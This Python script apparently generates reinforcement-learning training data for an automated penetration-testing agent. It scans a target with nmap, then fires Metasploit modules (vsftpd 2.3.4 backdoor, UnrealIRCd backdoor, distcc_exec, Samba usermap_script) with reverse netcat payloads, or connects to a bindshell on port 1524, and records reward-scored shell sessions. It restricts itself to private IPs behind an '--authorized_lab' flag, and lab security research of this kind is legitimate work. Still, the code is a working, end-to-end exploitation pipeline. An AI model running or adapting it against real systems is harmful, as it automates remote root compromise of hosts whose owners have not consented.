from __future__ import annotations

import argparse
import ipaddress
import json
import random
import re
import socket
import subprocess
import tempfile
from copy import deepcopy
from datetime import datetime, timezone
from pathlib import Path


EXPLOITS = [
    "exploit_bindshell",
    "exploit_vsftpd",
    "exploit_unrealircd",
    "exploit_distccd",
    "exploit_samba",
]

MSF_MODULES = {
    "exploit_vsftpd": {
        "module": "exploit/unix/ftp/vsftpd_234_backdoor",
        "rport": 21,
        "payload": None,
        "requires_lhost": False,
        "success_patterns": [
            "Command shell session",
            "session .* opened",
            "uid=0",
            "uid=0(root)",
            "root",
        ],
    },
    "exploit_unrealircd": {
        "module": "exploit/unix/irc/unreal_ircd_3281_backdoor",
        "rport": 6667,
        "payload": "cmd/unix/reverse_netcat",
        "requires_lhost": True,
        "success_patterns": [
            "Command shell session",
            "session .* opened",
            "uid=",
            "uid=0",
        ],
    },
    "exploit_distccd": {
        "module": "exploit/unix/misc/distcc_exec",
        "rport": 3632,
        "payload": "cmd/unix/reverse_netcat",
        "requires_lhost": True,
        "success_patterns": [
            "Command shell session",
            "session .* opened",
            "uid=",
            "uid=0",
        ],
    },
    "exploit_samba": {
        "module": "exploit/multi/samba/usermap_script",
        "rport": 139,
        "payload": "cmd/unix/reverse_netcat",
        "requires_lhost": True,
        "success_patterns": [
            "Command shell session",
            "session .* opened",
            "uid=",
            "uid=0",
        ],
    },
}


def now_str():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H-%M-%SZ")


def now_iso():
    return datetime.now(timezone.utc).isoformat()


def validate_private_target(target: str):
    ip = ipaddress.ip_address(target)
    if not ip.is_private:
        raise ValueError(
            f"Target {target} is not a private/lab IP. "
            "This script is intended only for authorised lab environments."
        )


def auto_detect_lhost(target: str) -> str:
    """
    Infer the Kali/local IP used to reach the target.
    UDP connect does not send packets.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target, 80))
        return s.getsockname()[0]
    finally:
        s.close()


def empty_state():
    return {
        "num_open_ports": 0,
        "has_ftp": False,
        "has_ssh": False,
        "has_telnet": False,
        "has_http": False,
        "has_mysql": False,
        "has_postgresql": False,
        "has_bindshell_1524": False,
        "has_samba": False,
        "has_tomcat": False,
        "has_vsftpd_234": False,
        "has_unrealircd": False,
        "has_distccd": False,
        "has_shell": False,
        "basic_scanned": False,
        "service_scanned": False,
        "failed_attempts": 0,
        "successful_exploits": 0,
        "last_error": "",
    }


def run_command(cmd, timeout=120, input_text=None):
    try:
        result = subprocess.run(
            cmd,
            input=input_text,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return {
            "cmd": cmd,
            "returncode": result.returncode,
            "stdout": result.stdout or "",
            "stderr": result.stderr or "",
        }

    except subprocess.TimeoutExpired as e:
        return {
            "cmd": cmd,
            "returncode": -1,
            "stdout": e.stdout or "",
            "stderr": f"TimeoutExpired after {timeout}s",
        }

    except FileNotFoundError as e:
        return {
            "cmd": cmd,
            "returncode": -1,
            "stdout": "",
            "stderr": f"Command not found: {cmd[0]} ({e})",
        }


def run_nmap(target: str, service_scan: bool):
    if service_scan:
        cmd = ["nmap", "-Pn", "-sV", "-sC", target]
        timeout = 180
    else:
        cmd = ["nmap", "-Pn", target]
        timeout = 90

    return run_command(cmd, timeout=timeout)


def parse_open_ports(nmap_output: str):
    ports = []

    for line in nmap_output.splitlines():
        line = line.strip()

        if "/tcp" in line and " open " in line:
            try:
                ports.append(int(line.split("/")[0]))
            except ValueError:
                pass

    return sorted(set(ports))


def parse_service_map(nmap_output: str):
    service_map = {}

    for line in nmap_output.splitlines():
        line = line.strip()

        if "/tcp" not in line or " open " not in line:
            continue

        parts = line.split()
        if len(parts) < 3:
            continue

        port_proto = parts[0]
        state = parts[1]
        service = parts[2]
        version = " ".join(parts[3:]) if len(parts) > 3 else ""

        if state == "open":
            port = port_proto.split("/")[0]
            service_map[port] = {
                "service": service,
                "version": version,
            }

    return service_map


def update_state_from_nmap(state: dict, open_ports: list[int], service_map: dict, service_scan: bool):
    services = {info["service"].lower() for info in service_map.values()}
    versions = " | ".join(
        f"{port}:{info['version']}"
        for port, info in service_map.items()
        if info.get("version")
    ).lower()

    state["num_open_ports"] = len(open_ports)
    state["has_ftp"] = "ftp" in services or 21 in open_ports
    state["has_ssh"] = "ssh" in services or 22 in open_ports
    state["has_telnet"] = "telnet" in services or 23 in open_ports
    state["has_http"] = "http" in services or 80 in open_ports or 8180 in open_ports
    state["has_mysql"] = "mysql" in services or 3306 in open_ports
    state["has_postgresql"] = "postgresql" in services or 5432 in open_ports
    state["has_bindshell_1524"] = 1524 in open_ports

    state["has_samba"] = (
        139 in open_ports
        or 445 in open_ports
        or "samba" in versions
        or "netbios" in services
        or "microsoft-ds" in services
    )

    state["has_tomcat"] = "tomcat" in versions
    state["has_vsftpd_234"] = "vsftpd 2.3.4" in versions
    state["has_unrealircd"] = "unrealircd" in versions or 6667 in open_ports
    state["has_distccd"] = "distccd" in versions or "distccd" in services or 3632 in open_ports

    state["basic_scanned"] = True
    if service_scan:
        state["service_scanned"] = True

    return state


def save_text(path: Path, text: str):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def try_bindshell(target: str):
    commands = "whoami\nid\nuname -a\nexit\n"

    result = run_command(
        ["nc", target, "1524"],
        input_text=commands,
        timeout=10,
    )

    output = (result["stdout"] + "\n" + result["stderr"]).lower()

    success = (
        "uid=0" in output
        or "uid=0(root)" in output
        or "root" in output
        or ("linux" in output and result["returncode"] == 0)
    )

    return {
        "success": success,
        "tool": "nc",
        "output": result,
    }


def run_msf_exploit(action: str, target: str, lhost: str, raw_dir: Path, run_id: str, step: int):
    config = MSF_MODULES[action]

    rc_lines = [
        f"use {config['module']}",
        f"set RHOSTS {target}",
        f"set RHOST {target}",
        f"set RPORT {config['rport']}",
        "set VERBOSE false",
    ]

    if config["payload"]:
        rc_lines.append(f"set payload {config['payload']}")

    if config["requires_lhost"]:
        rc_lines.append(f"set LHOST {lhost}")

    rc_lines.extend([
        "run -z",
        "sleep 8",
        "sessions -C \"whoami; id; uname -a\"",
        "sleep 2",
        "sessions -K",
        "exit -y",
    ])

    rc_content = "\n".join(rc_lines) + "\n"

    with tempfile.NamedTemporaryFile("w", suffix=".rc", delete=False, encoding="utf-8") as f:
        f.write(rc_content)
        rc_path = f.name

    result = run_command(
        ["msfconsole", "-q", "-r", rc_path],
        timeout=180,
    )

    combined = result["stdout"] + "\n" + result["stderr"]
    raw_path = raw_dir / f"{run_id}_step{step}_{action}_msf.txt"
    save_text(raw_path, combined)

    combined_lower = combined.lower()

    success = False
    for pattern in config["success_patterns"]:
        if re.search(pattern.lower(), combined_lower):
            success = True
            break

    # Avoid false positive when Metasploit explicitly says no session was created.
    if "no session was created" in combined_lower:
        success = False

    return {
        "success": success,
        "tool": "metasploit",
        "module": config["module"],
        "rport": config["rport"],
        "payload": config["payload"],
        "lhost": lhost if config["requires_lhost"] else None,
        "raw_output_path": str(raw_path),
        "returncode": result["returncode"],
    }


def available_exploits(state: dict):
    candidates = []

    if state["has_bindshell_1524"]:
        candidates.append("exploit_bindshell")

    if state["has_vsftpd_234"] or state["has_ftp"]:
        candidates.append("exploit_vsftpd")

    if state["has_unrealircd"]:
        candidates.append("exploit_unrealircd")

    if state["has_distccd"]:
        candidates.append("exploit_distccd")

    if state["has_samba"]:
        candidates.append("exploit_samba")

    return candidates


def choose_stable_exploit(state: dict):
    """
    Stable choice for good/recovery trajectories.
    Prefer reliable shell verification first, then other modules.
    """
    if state["has_bindshell_1524"]:
        return "exploit_bindshell"

    if state["has_samba"]:
        return "exploit_samba"

    if state["has_unrealircd"]:
        return "exploit_unrealircd"

    if state["has_distccd"]:
        return "exploit_distccd"

    if state["has_vsftpd_234"] or state["has_ftp"]:
        return "exploit_vsftpd"

    return random.choice(EXPLOITS)


def choose_random_available_exploit(state: dict):
    """
    Random choice for noisy trajectories.
    This keeps the dataset diverse.
    """
    candidates = available_exploits(state)

    if candidates:
        return random.choice(candidates)

    return random.choice(EXPLOITS)


def choose_available_exploit(state: dict, mode: str = "stable"):
    if mode == "random":
        return choose_random_available_exploit(state)

    return choose_stable_exploit(state)


def gen_good():
    return [
        "scan_basic",
        "scan_service",
        "auto_exploit",
        "stop",
    ]


def gen_recover():
    return [
        random.choice(EXPLOITS),
        "scan_basic",
        "scan_service",
        "auto_exploit",
        "stop",
    ]


def gen_noisy():
    return [
        random.choice(["scan_basic", "scan_service"]),
        random.choice(["scan_basic", "scan_service"]),
        "random_exploit",
        "auto_exploit",
        "stop",
    ]


def gen_fail():
    fail_paths = [
        ["stop"],
        ["scan_basic", "stop"],
        ["scan_service", "stop"],
        ["exploit_vsftpd", "stop"],
        ["exploit_unrealircd", "stop"],
        ["exploit_distccd", "stop"],
        ["exploit_samba", "stop"],
        ["scan_basic", "exploit_unrealircd", "stop"],
        ["scan_basic", "exploit_distccd", "stop"],
        ["scan_basic", "exploit_samba", "stop"],
        ["scan_service", "scan_basic", "stop"],
        ["scan_service", "random_exploit", "stop"],
    ]
    return random.choice(fail_paths)


def build_plan(n_runs: int):
    """
    Build a shuffled plan so even small test runs include mixed policy types.
    """
    policies = (
        ["good"] * 90
        + ["recover"] * 90
        + ["noisy"] * 90
        + ["fail"] * 80
    )

    plan = []
    while len(plan) < n_runs:
        block = policies[:]
        random.shuffle(block)
        plan.extend(block)

    return plan[:n_runs]


def apply_action(action, state, target, lhost, raw_dir, run_id, step):
    done = False
    resolved_action = action
    before_state = deepcopy(state)

    if action == "auto_exploit":
        resolved_action = choose_available_exploit(state, mode="stable")

    elif action == "random_exploit":
        resolved_action = choose_available_exploit(state, mode="random")

    if resolved_action == "scan_basic":
        result = run_nmap(target, service_scan=False)
        raw_path = raw_dir / f"{run_id}_step{step}_scan_basic.txt"
        save_text(raw_path, result["stdout"] + "\n" + result["stderr"])

        if result["returncode"] == 0:
            open_ports = parse_open_ports(result["stdout"])
            service_map = parse_service_map(result["stdout"])
            update_state_from_nmap(state, open_ports, service_map, service_scan=False)
            reward = -0.05
            info = {
                "success": True,
                "raw_output_path": str(raw_path),
                "open_ports": open_ports,
                "service_map": service_map,
            }
        else:
            state["failed_attempts"] += 1
            state["last_error"] = result["stderr"]
            reward = -1.0
            info = {
                "success": False,
                "raw_output_path": str(raw_path),
                "error": result["stderr"],
            }

    elif resolved_action == "scan_service":
        result = run_nmap(target, service_scan=True)
        raw_path = raw_dir / f"{run_id}_step{step}_scan_service.txt"
        save_text(raw_path, result["stdout"] + "\n" + result["stderr"])

        if result["returncode"] == 0:
            open_ports = parse_open_ports(result["stdout"])
            service_map = parse_service_map(result["stdout"])
            update_state_from_nmap(state, open_ports, service_map, service_scan=True)
            reward = -0.08
            info = {
                "success": True,
                "raw_output_path": str(raw_path),
                "open_ports": open_ports,
                "service_map": service_map,
            }
        else:
            state["failed_attempts"] += 1
            state["last_error"] = result["stderr"]
            reward = -1.0
            info = {
                "success": False,
                "raw_output_path": str(raw_path),
                "error": result["stderr"],
            }

    elif resolved_action == "exploit_bindshell":
        result = try_bindshell(target)

        if result["success"]:
            state["has_shell"] = True
            state["successful_exploits"] += 1
            reward = 12.0
        else:
            state["failed_attempts"] += 1
            reward = -1.0

        info = result

    elif resolved_action in MSF_MODULES:
        result = run_msf_exploit(
            action=resolved_action,
            target=target,
            lhost=lhost,
            raw_dir=raw_dir,
            run_id=run_id,
            step=step,
        )

        if result["success"]:
            state["has_shell"] = True
            state["successful_exploits"] += 1
            reward_map = {
                "exploit_vsftpd": 10.0,
                "exploit_unrealircd": 9.0,
                "exploit_distccd": 8.5,
                "exploit_samba": 8.0,
            }
            reward = reward_map.get(resolved_action, 8.0)
        else:
            state["failed_attempts"] += 1
            reward = -1.0

        info = result

    elif resolved_action == "stop":
        done = True

        if state["has_shell"]:
            reward = 6.0
            info = {
                "stopped": True,
                "final_success": True,
            }
        else:
            reward = -2.0
            info = {
                "stopped": True,
                "final_success": False,
            }

    else:
        state["failed_attempts"] += 1
        reward = -1.0
        info = {
            "error": f"unknown action: {resolved_action}",
        }

    return {
        "action_requested": action,
        "action_executed": resolved_action,
        "state_before": before_state,
        "state_after": deepcopy(state),
        "reward": float(reward),
        "done": bool(done),
        "info": info,
    }


def rollout(actions, policy, target, lhost, raw_dir, run_id):
    state = empty_state()
    history = []
    done = False

    for idx, action in enumerate(actions, start=1):
        if done:
            break

        step_result = apply_action(
            action=action,
            state=state,
            target=target,
            lhost=lhost,
            raw_dir=raw_dir,
            run_id=run_id,
            step=idx,
        )

        history.append({
            "step": idx,
            "policy": policy,
            **step_result,
        })

        done = step_result["done"]

    if not done:
        step_result = apply_action(
            action="stop",
            state=state,
            target=target,
            lhost=lhost,
            raw_dir=raw_dir,
            run_id=run_id,
            step=len(history) + 1,
        )

        history.append({
            "step": len(history) + 1,
            "policy": policy,
            **step_result,
        })

    return history


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True, help="Target IP, e.g. Metasploitable IP")
    parser.add_argument("--lhost", default=None, help="Kali/local IP for reverse payloads")
    parser.add_argument("--runs", type=int, default=20)
    parser.add_argument("--out_dir", default="dataset/real_logs/msf_rl_env_runs")
    parser.add_argument("--raw_dir", default="dataset/real_logs/msf_raw")
    parser.add_argument("--seed", type=int, default=42)
    parser.add_argument("--authorized_lab", action="store_true")
    args = parser.parse_args()

    if not args.authorized_lab:
        raise SystemExit(
            "Refusing to run without --authorized_lab. "
            "Only use this in an authorised lab environment."
        )

    validate_private_target(args.target)

    random.seed(args.seed)

    out_dir = Path(args.out_dir)
    raw_dir = Path(args.raw_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    raw_dir.mkdir(parents=True, exist_ok=True)

    lhost = args.lhost or auto_detect_lhost(args.target)

    print(f"[*] Target: {args.target}")
    print(f"[*] LHOST:  {lhost}")
    print(f"[*] Runs:   {args.runs}")
    print(f"[*] Out:    {out_dir}")
    print(f"[*] Raw:    {raw_dir}")

    plan = build_plan(args.runs)

    for idx, policy in enumerate(plan):
        if policy == "good":
            actions = gen_good()
        elif policy == "recover":
            actions = gen_recover()
        elif policy == "noisy":
            actions = gen_noisy()
        else:
            actions = gen_fail()

        run_id = f"msf_batch_{idx:03d}_{policy}_{now_str()}"

        print(f"\n[RUN {idx + 1}/{args.runs}] {run_id}")
        print(f"policy={policy}, actions={actions}")

        history = rollout(
            actions=actions,
            policy=policy,
            target=args.target,
            lhost=lhost,
            raw_dir=raw_dir,
            run_id=run_id,
        )

        final_success = any(
            step["state_after"].get("has_shell") is True
            for step in history
        )

        out = {
            "run_id": run_id,
            "target": args.target,
            "lhost": lhost,
            "created_at": now_iso(),
            "policy_name": policy,
            "action_plan": actions,
            "final_success": final_success,
            "history": history,
        }

        path = out_dir / f"{run_id}.json"
        with open(path, "w", encoding="utf-8") as f:
            json.dump(out, f, indent=2, ensure_ascii=False)

        print(f"[OK] saved {path}")


if __name__ == "__main__":
    main()